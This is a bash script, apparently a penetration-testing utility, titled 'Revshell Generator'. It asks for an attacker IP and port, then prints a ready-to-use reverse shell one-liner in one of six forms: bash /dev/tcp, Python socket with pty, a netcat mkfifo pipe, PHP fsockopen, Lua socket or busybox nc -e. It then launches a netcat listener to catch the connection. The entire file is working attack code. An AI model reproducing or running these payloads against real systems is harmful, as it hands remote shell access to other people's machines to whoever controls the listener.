#!/bin/bash

# --- Color Definitions ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# --- ASCII Header ---
echo -e "${CYAN}${BOLD}"
cat << "EOF"
 ____                 _           _ _            
|  _ \ _____   _____| |__   ___| | |            
| |_) / _ \ \ / / __| '_ \ / _ \ | |            
|  _ <  __/\ V /\__ \ | | |  __/ | |            
|_|_\_\___| \_/ |___/_| |_|\___|_|_|            
 / ___| ___ _ __   ___ _ __ __ _| |_ ___  _ __ 
| |  _ / _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|
| |_| |  __/ | | |  __/ | | (_| | || (_) | |    
 \____|\___|_| |_|\___|_|  \__,_|\__\___/|_|    

EOF
echo -e "${NC}"

# --- Header Function ---
print_section() {
    echo -e "\n${PURPLE}${BOLD}══════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}  [!] $1 ${NC}"
    echo -e "${PURPLE}${BOLD}══════════════════════════════════════════════════${NC}"
}

echo -e "${GREEN}${BOLD}***** REVERSE SHELL GENERATOR & LISTENER *****${NC}"

echo -e "\n${YELLOW}${BOLD}Available Shell Types:${NC}"
echo -e "  ${CYAN}(1)${NC} Bash       ${CYAN}(4)${NC} PHP"
echo -e "  ${CYAN}(2)${NC} Python     ${CYAN}(5)${NC} Lua"
echo -e "  ${CYAN}(3)${NC} Netcat     ${CYAN}(6)${NC} Busybox"

echo -ne "\n${YELLOW}${BOLD}Choose a type [1-6]: ${NC}"
read -r type

echo -ne "${YELLOW}${BOLD}Enter LHOST (Your IP): ${NC}"
read -r ip_address

echo -ne "${YELLOW}${BOLD}Enter LPORT (Your Port): ${NC}"
read -r port

# --- Validation ---
if [[ -z "$ip_address" || -z "$port" ]]; then
    echo -e "\n${RED}${BOLD}[!] Error: IP Address and Port are required!${NC}"
    exit 1
fi

# --- Payload Generation ---
intro="REVERSE SHELL PAYLOAD"

print_section "$intro"

case $type in
    1)
        payload="bash -i >& /dev/tcp/$ip_address/$port 0>&1"
        ;;
    2)
        payload="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_address\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
        ;;
    3)
        payload="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $ip_address $port >/tmp/f"
        ;;
    4)
        payload="php -r '\$sock=fsockopen(\"$ip_address\",$port);system(\"bash <&3 >&3 2>&3\");'"
        ;;
    5)
        payload="lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$ip_address','$port');os.execute('bash -i <&3 >&3 2>&3');\""
        ;;
    6)
        payload="busybox nc $ip_address $port -e bash"
        ;;
    *)
        echo -e "${RED}[!] Invalid selection!!${NC}"
        exit 1
        ;;
esac

# Output Payload
echo -e "${GREEN}${BOLD}$payload${NC}"

# --- Listener Part ---
print_section "LISTENER SETUP"
echo -e "${YELLOW}Payload is ready. To catch the shell, run:${NC}"
echo -e "${RED}${BOLD}nc -lvnp $port${NC}"

echo -ne "\n${CYAN}Press [Enter] to start listening now...${NC}"
read -r
echo -e "${GREEN}Starting listener on $port...${NC}"
nc -lvnp "$port"